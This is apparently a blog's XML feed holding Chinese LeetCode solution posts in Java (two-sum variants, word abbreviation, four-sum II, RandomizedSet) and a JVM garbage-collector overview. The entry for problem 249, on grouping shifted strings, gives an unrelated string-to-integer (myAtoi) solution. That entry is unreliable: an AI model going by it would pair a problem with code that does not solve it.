&#123;</span><br><span class="line">			<span class="keyword">this</span>.numCounts.put(number, <span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Find if there exists any pair of numbers which sum is equal to the value.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> boolean <span class="title">find</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (Map.Entry&lt;Integer, Integer&gt; entry : <span class="keyword">this</span>.numCounts.entrySet()) &#123;</span><br><span class="line">			<span class="keyword">int</span> complement = value - entry.getKey();</span><br><span class="line">			<span class="keyword">if</span> (complement != entry.getKey()) &#123;</span><br><span class="line">				<span class="keyword">if</span> (<span class="keyword">this</span>.numCounts.containsKey(complement)) &#123;</span><br><span class="line">					<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">if</span> (entry.getValue() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">					<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>HashMap</tag>
      </tags>
  </entry>
  <entry>
    <title>249. 移位字符串分组</title>
    <url>/2020/04/03/LeetCode/leetcode-000249-%E7%A7%BB%E4%BD%8D%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%86%E7%BB%84/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个字符串，对该字符串可以进行 “移位” 的操作，也就是将字符串中每个字母都变为其在字母表中后续的字母，比如：”abc” -&gt; “bcd”。这样，我们可以持续进行 “移位” 操作，从而生成如下移位序列：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;abc&quot; -&gt; &quot;bcd&quot; -&gt; ... -&gt; &quot;xyz&quot;</span><br></pre></td></tr></table></figure>

<p>给定一个包含仅小写字母字符串的列表，将该列表中所有满足 “移位” 操作规律的组合进行分组并返回。</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: [<span class="string">"abc"</span>, <span class="string">"bcd"</span>, <span class="string">"acef"</span>, <span class="string">"xyz"</span>, <span class="string">"az"</span>, <span class="string">"ba"</span>, <span class="string">"a"</span>, <span class="string">"z"</span>]</span><br><span class="line">输出: </span><br><span class="line">[</span><br><span class="line">  [<span class="string">"abc"</span>,<span class="string">"bcd"</span>,<span class="string">"xyz"</span>],</span><br><span class="line">  [<span class="string">"az"</span>,<span class="string">"ba"</span>],</span><br><span class="line">  [<span class="string">"acef"</span>],</span><br><span class="line">  [<span class="string">"a"</span>,<span class="string">"z"</span>]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><ol>
<li>去除字符串首尾的空格字符，判断长度是否为0，为0则返回0；</li>
<li>判断整数的符号，并用sign变量标记，同时，删除字符串首位的+或者-符号</li>
<li>遍历余下的字符串，如果是数字的话，首先判断当前的结果是否大于等于Integer.MAX_VALUE / 10或者小于等于Integer.MIN_VALUE / 10,是的话，表示溢出，返回Integer.MAX_VALUE或者Integer.MIN_VALUE;</li>
<li>如果不是数字的话，终止当前流程，返回最终结果。</li>
</ol>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">myAtoi</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">		str = str.trim();</span><br><span class="line">		<span class="keyword">if</span> (str.length() == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> sign = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">if</span> (str.startsWith(<span class="string">"-"</span>)) &#123;</span><br><span class="line">			sign = <span class="number">-1</span>;</span><br><span class="line">			str = str.substring(<span class="number">1</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (str.startsWith(<span class="string">"+"</span>)) &#123;</span><br><span class="line">			str = str.substring(<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">char</span> c : str.toCharArray()) &#123;</span><br><span class="line">			<span class="keyword">if</span> (Character.isDigit(c)) &#123;</span><br><span class="line">				<span class="keyword">if</span> (res &gt; Integer.MAX_VALUE / <span class="number">10</span></span><br><span class="line">						|| (res == Integer.MAX_VALUE / <span class="number">10</span> &amp;&amp; (c - <span class="string">'0'</span>) &gt; Integer.MAX_VALUE % <span class="number">10</span>)) &#123;</span><br><span class="line">					<span class="keyword">return</span> Integer.MAX_VALUE;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (res &lt; Integer.MIN_VALUE / <span class="number">10</span></span><br><span class="line">						|| (res == Integer.MIN_VALUE / <span class="number">10</span> &amp;&amp; (c - <span class="string">'0'</span>) &gt; -(Integer.MIN_VALUE % <span class="number">10</span>))) &#123;</span><br><span class="line">					<span class="keyword">return</span> Integer.MIN_VALUE;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				res = res * <span class="number">10</span> + (c - <span class="string">'0'</span>) * sign;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> res;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>HashMap</tag>
      </tags>
  </entry>
  <entry>
    <title>288. 单词的唯一缩写</title>
    <url>/2020/04/03/LeetCode/leetcode-000288-%E5%8D%95%E8%AF%8D%E7%9A%84%E5%94%AF%E4%B8%80%E7%BC%A9%E5%86%99/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>一个单词的缩写需要遵循 &lt;起始字母&gt;&lt;中间字母数&gt;&lt;结尾字母&gt; 这样的格式。</p>
<p>以下是一些单词缩写的范例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a) it                      --&gt; it    (没有缩写)</span><br><span class="line"></span><br><span class="line">     1</span><br><span class="line">     ↓</span><br><span class="line">b) d|o|g                   --&gt; d1g</span><br><span class="line"></span><br><span class="line">              1    1  1</span><br><span class="line">     1---5----0----5--8</span><br><span class="line">     ↓   ↓    ↓    ↓  ↓    </span><br><span class="line">c) i|nternationalizatio|n  --&gt; i18n</span><br><span class="line"></span><br><span class="line">              1</span><br><span class="line">     1---5----0</span><br><span class="line">     ↓   ↓    ↓</span><br><span class="line">d) l|ocalizatio|n          --&gt; l10n</span><br></pre></td></tr></table></figure>

<p>假设你有一个字典和一个单词，请你判断该单词的缩写在这本字典中是否唯一。若单词的缩写在字典中没有任何 <em>其他</em> 单词与其缩写相同，则被称为单词的唯一缩写。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">给定 dictionary = [ <span class="string">"deer"</span>, <span class="string">"door"</span>, <span class="string">"cake"</span>, <span class="string">"card"</span> ]</span><br><span class="line"></span><br><span class="line">isUnique(<span class="string">"dear"</span>) -&gt; <span class="keyword">false</span></span><br><span class="line">isUnique(<span class="string">"cart"</span>) -&gt; <span class="keyword">true</span></span><br><span class="line">isUnique(<span class="string">"cane"</span>) -&gt; <span class="keyword">false</span></span><br><span class="line">isUnique(<span class="string">"make"</span>) -&gt; <span class="keyword">true</span></span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>借助HaspMap，这里需要注意相同的字符串是算作唯一的。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ValidWordAbbr</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> Map&lt;String, Set&lt;String&gt;&gt; abbrDict = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">ValidWordAbbr</span><span class="params">(String[] dictionary)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (String s : dictionary) &#123;</span><br><span class="line">			String abbr = toAbbr(s);</span><br><span class="line">			Set&lt;String&gt; words = abbrDict.containsKey(abbr) ? abbrDict.get(abbr) : <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">			words.add(s);</span><br><span class="line">			abbrDict.put(abbr, words);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isUnique</span><span class="params">(String word)</span> </span>&#123;</span><br><span class="line">		String abbr = toAbbr(word);</span><br><span class="line">		Set&lt;String&gt; words = abbrDict.get(abbr);</span><br><span class="line">		<span class="keyword">return</span> words == <span class="keyword">null</span> || (words.size() == <span class="number">1</span> &amp;&amp; words.contains(word));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">private</span> String <span class="title">toAbbr</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> n = s.length();</span><br><span class="line">		<span class="keyword">if</span> (n &lt;= <span class="number">2</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> s;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> s.charAt(<span class="number">0</span>) + Integer.toString(n - <span class="number">2</span>) + s.charAt(n - <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>HashMap</tag>
      </tags>
  </entry>
  <entry>
    <title>454. 四数相加 II</title>
    <url>/2020/04/03/LeetCode/leetcode-000454-%E5%9B%9B%E6%95%B0%E7%9B%B8%E5%8A%A0%20II/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定四个包含整数的数组列表 A , B , C , D ,计算有多少个元组 (i, j, k, l) ，使得 A[i] + B[j] + C[k] + D[l] = 0。</p>
<p>为了使问题简单化，所有的 A, B, C, D 具有相同的长度 N，且 0 ≤ N ≤ 500 。所有整数的范围在 -2^28 到 2^28 - 1 之间，最终结果不会超过 2^31 - 1 。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line">A = [ <span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">B = [-<span class="number">2</span>,-<span class="number">1</span>]</span><br><span class="line">C = [-<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">D = [ <span class="number">0</span>, <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">输出:</span><br><span class="line"><span class="number">2</span></span><br><span class="line"></span><br><span class="line">解释:</span><br><span class="line">两个元组如下:</span><br><span class="line"><span class="number">1</span>. (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>) -&gt; A[<span class="number">0</span>] + B[<span class="number">0</span>] + C[<span class="number">0</span>] + D[<span class="number">1</span>] = <span class="number">1</span> + (-<span class="number">2</span>) + (-<span class="number">1</span>) + <span class="number">2</span> = <span class="number">0</span></span><br><span class="line"><span class="number">2</span>. (<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>) -&gt; A[<span class="number">1</span>] + B[<span class="number">1</span>] + C[<span class="number">0</span>] + D[<span class="number">0</span>] = <span class="number">2</span> + (-<span class="number">1</span>) + (-<span class="number">1</span>) + <span class="number">0</span> = <span class="number">0</span></span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>将四个数组分为两组，两两求和就是两数相加问题。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">fourSumCount</span><span class="params">(<span class="keyword">int</span>[] A, <span class="keyword">int</span>[] B, <span class="keyword">int</span>[] C, <span class="keyword">int</span>[] D)</span> </span>&#123;</span><br><span class="line">		Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">		<span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.length; i++) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; B.length; j++) &#123;</span><br><span class="line">				<span class="keyword">int</span> sumAB = A[i] + B[j];</span><br><span class="line">				<span class="keyword">if</span> (map.containsKey(sumAB)) &#123;</span><br><span class="line">					map.put(sumAB, map.get(sumAB) + <span class="number">1</span>);</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					map.put(sumAB, <span class="number">1</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; C.length; i++) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; D.length; j++) &#123;</span><br><span class="line">				<span class="keyword">int</span> sumCD = -(C[i] + D[j]);</span><br><span class="line">				<span class="keyword">if</span> (map.containsKey(sumCD)) &#123;</span><br><span class="line">					res += map.get(sumCD);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> res;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
        <tag>Math</tag>
        <tag>HashMap</tag>
      </tags>
  </entry>
  <entry>
    <title>380. 常数时间插入、删除和获取随机元素</title>
    <url>/2020/04/03/LeetCode/leetcode-000380-%E5%B8%B8%E6%95%B0%E6%97%B6%E9%97%B4%E6%8F%92%E5%85%A5%E3%80%81%E5%88%A0%E9%99%A4%E5%92%8C%E8%8E%B7%E5%8F%96%E9%9A%8F%E6%9C%BA%E5%85%83%E7%B4%A0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><ol>
<li>insert(val)：当元素 val 不存在时，向集合中插入该项。</li>
<li>remove(val)：元素 val 存在时，从集合中移除该项。</li>
<li>getRandom：随机返回现有集合中的一项。每个元素应该有相同的概率被返回。</li>
</ol>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 初始化一个空的集合。</span><br><span class="line">RandomizedSet randomSet &#x3D; new RandomizedSet();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 向集合中插入 1 。返回 true 表示 1 被成功地插入。</span><br><span class="line">randomSet.insert(1);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 返回 false ，表示集合中不存在 2 。</span><br><span class="line">randomSet.remove(2);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 向集合中插入 2 。返回 true 。集合现在包含 [1,2] 。</span><br><span class="line">randomSet.insert(2);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; getRandom 应随机返回 1 或 2 。</span><br><span class="line">randomSet.getRandom();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 从集合中移除 1 ，返回 true 。集合现在包含 [2] 。</span><br><span class="line">randomSet.remove(1);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 2 已在集合中，所以返回 false 。</span><br><span class="line">randomSet.insert(2);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 由于 2 是集合中唯一的数字，getRandom 总是返回 2 。</span><br><span class="line">randomSet.getRandom();</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>借助HaspMap和ArrayList</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RandomizedSet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> Map&lt;Integer, Integer&gt; map;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> List&lt;Integer&gt; list;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> Random rand = <span class="keyword">new</span> Random();</span><br><span class="line"></span><br><span class="line">	<span class="comment">/** Initialize your data structure here. */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">RandomizedSet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">		list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Inserts a value to the set. Returns true if the set did not already</span></span><br><span class="line"><span class="comment">	 * contain the specified element.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">insert</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (map.containsKey(val)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		map.put(val, list.size());</span><br><span class="line">		list.add(list.size(), val);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Removes a value from the set. Returns true if the set contained the</span></span><br><span class="line"><span class="comment">	 * specified element.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">remove</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (!map.containsKey(val)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">int</span> value = list.get(list.size() - <span class="number">1</span>);</span><br><span class="line">		<span class="keyword">int</span> idx = map.get(val);</span><br><span class="line">		list.set(idx, value);</span><br><span class="line">		map.put(value, idx);</span><br><span class="line">		<span class="comment">// delete the last element</span></span><br><span class="line">		list.remove(list.size() - <span class="number">1</span>);</span><br><span class="line">		map.remove(val);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/** Get a random element from the set. */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getRandom</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> list.get(rand.nextInt(list.size()));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>HashMap</tag>
      </tags>
  </entry>
  <entry>
    <title>16.24. 数对和</title>
    <url>/2020/04/03/LeetCode/leetcode-%E9%9D%A2%E8%AF%95%E9%A2%98-16.24-%E6%95%B0%E5%AF%B9%E5%92%8C/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>设计一个算法，找出数组中两数之和为指定值的所有整数对。一个数只能属于一个数对。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: nums &#x3D; [5,6,5], target &#x3D; 11</span><br><span class="line">输出: [[5,6]]</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: nums = [<span class="number">5</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">6</span>], target = <span class="number">11</span></span><br><span class="line">输出: [[<span class="number">5</span>,<span class="number">6</span>],[<span class="number">5</span>,<span class="number">6</span>]]</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>借助HaspMap</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; pairSums(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">		Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">		List&lt;List&lt;Integer&gt;&gt; ans = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">			Integer count = map.get(target - num);</span><br><span class="line">			<span class="keyword">if</span> (count != <span class="keyword">null</span>) &#123;</span><br><span class="line">				ans.add(Arrays.asList(num, target - num));</span><br><span class="line">				<span class="keyword">if</span> (count == <span class="number">1</span>) &#123;</span><br><span class="line">					map.remove(target - num);</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					map.put(target - num, --count);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				map.put(num, map.getOrDefault(num, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> ans;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>排序+双指针</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; pairSums(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">		Arrays.sort(nums);</span><br><span class="line">		List&lt;List&lt;Integer&gt;&gt; ans = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">		<span class="keyword">int</span> left = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> right = nums.length - <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">			<span class="keyword">int</span> sum = nums[left] + nums[right];</span><br><span class="line">			<span class="keyword">if</span> (sum &lt; target) &#123;</span><br><span class="line">				++left;</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (sum &gt; target) &#123;</span><br><span class="line">				--right;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				ans.add(Arrays.asList(nums[left++], nums[right--]));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> ans;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
        <tag>HashMap</tag>
      </tags>
  </entry>
  <entry>
    <title>垃圾回收器概览</title>
    <url>/2020/04/03/Java/JVM/2020-03-29-Java-%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E5%99%A8/</url>
    <content><![CDATA[<h1 id="常见的几种垃圾回收器介绍"><a href="#常见的几种垃圾回收器介绍" class="headerlink" title="常见的几种垃圾回收器介绍"></a>常见的几种垃圾回收器介绍</h1><h2 id="Serial收集器"><a href="#Serial收集器" class="headerlink" title="Serial收集器"></a>Serial收集器</h2><p>Serial收集器是最基础、历史最悠久的收集器，它是一个单线程工作的收集器。它在进行垃圾收集的时候，必须暂停其他所有工作线程，知道它收集结束。</p>
<p><img src="https://huhansi.github.io/images/2020-04-21-collector1.jpg" alt="Serial收集器"></p>
<p>它是HotSpot虚拟机运行在客户端模式下的默认新生代收集器，有着优于其他收集器的地方，那就是简单高效。对于内存资源受限的环境，它是所有收集器里额外内存消耗最小的；对于单核处理器或处理器核心数较少的环境来说，Serial收集器由于没有现成交互的开销，专心做垃圾收集自然可以获得最高的单线程收集效率。</p>
<h2 id="ParNew收集器"><a href="#ParNew收集器" class="headerlink" title="ParNew收集器"></a>ParNew收集器</h2><p>ParNew收集器实质上是Serial收集器的多线程并行版本，除了同事使用多线程进行垃圾收集之外，其余的行为和Serial收集器一致。</p>
<p>ParNew收集器是激活CMS后的默认新生代收集器。</p>
<p><img src="https://huhansi.github.io/images/2020-04-21-collector2.jpg" alt="ParNew收集器"></p>
<h2 id="Parallel-Scavenge收集器"><a href="#Parallel-Scavenge收集器" class="headerlink" title="Parallel Scavenge收集器"></a>Parallel Scavenge收集器</h2><p>Parallel Scavenge收集器是并行的多线程新生代收集器，它使用复制算法。Parallel Scavenge收集器的目标是达到一个可控制的吞吐量（Throughput）。</p>
<p>停顿时间越短就越适合需要与用户交互的程序，良好的响应速度能提升用户体验。而高吞吐量则可以高效率地利用CPU时间，尽快完成程序的运算任务，主要适合在后台运算而不需要太多交互的任务。</p>
<p>Parallel Scavenge收集器除了会显而易见地提供可以精确控制吞吐量的参数，还提供了一个参数-XX:+UseAdaptiveSizePolicy，这是一个开关参数，打开参数后，就不需要手工指定新生代的大小（-Xmn）、Eden和Survivor区的比例（-XX:SurvivorRatio）、晋升老年代对象年龄（-XX:PretenureSizeThreshold）等细节参数了，虚拟机会根据当前系统的运行情况收集性能监控信息，动态调整这些参数以提供最合适的停顿时间或者最大的吞吐量，这种方式称为GC自适应的调节策略（GC Ergonomics）。自适应调节策略也是Parallel Scavenge收集器与ParNew收集器的一个重要区别。</p>
<p>另外值得注意的一点是，Parallel Scavenge收集器无法与CMS收集器配合使用，所以在JDK 1.6推出Parallel Old之前，如果新生代选择Parallel Scavenge收集器，老年代只有Serial Old收集器能与之配合使用。</p>
<h2 id="Serial-Old收集器"><a href="#Serial-Old收集器" class="headerlink" title="Serial Old收集器"></a>Serial Old收集器</h2><p>Serial Old 是 Serial收集器的老年代版本，它同样是一个单线程收集器，使用“标记-整理”（Mark-Compact）算法。</p>
<p>此收集器的主要意义也是在于给Client模式下的虚拟机使用。如果在Server模式下，它还有两大用途：</p>
<ul>
<li>在JDK1.5 以及之前版本（Parallel Old诞生以前）中与Parallel Scavenge收集器搭配使用。</li>
<li>作为CMS收集器的后备预案，在并发收集发生Concurrent Mode Failure时使用。</li>
</ul>
<p>它的工作流程与Serial收集器相同，这里给出Serial/Serial Old配合使用的工作流程图：</p>
<p><img src="https://huhansi.github.io/images/2020-04-21-collector3.jpg" alt="Serial Old收集器"></p>
<h2 id="Parallel-Old收集器"><a href="#Parallel-Old收集器" class="headerlink" title="Parallel Old收集器"></a>Parallel Old收集器</h2><p>Parallel Old收集器是Parallel Scavenge收集器的老年代版本，使用<strong>多线程</strong>和<strong>“标记-整理”</strong>算法。前面已经提到过，这个收集器是在JDK 1.6中才开始提供的，在此之前，如果新生代选择了Parallel Scavenge收集器，老年代除了Serial Old以外别无选择，所以在Parallel Old诞生以后，<strong>“吞吐量优先”收集器</strong>终于有了比较名副其实的应用组合，在<strong>注重吞吐量</strong>以及<strong>CPU资源敏感</strong>的场合，都可以优先考虑Parallel Scavenge加Parallel Old收集器。Parallel Old收集器的工作流程与Parallel Scavenge相同，这里给出Parallel Scavenge/Parallel Old收集器配合使用的流程图：</p>
<p><img src="https://huhansi.github.io/images/2020-04-21-collector4.jpg" alt="Parallel Old收集器"></p>
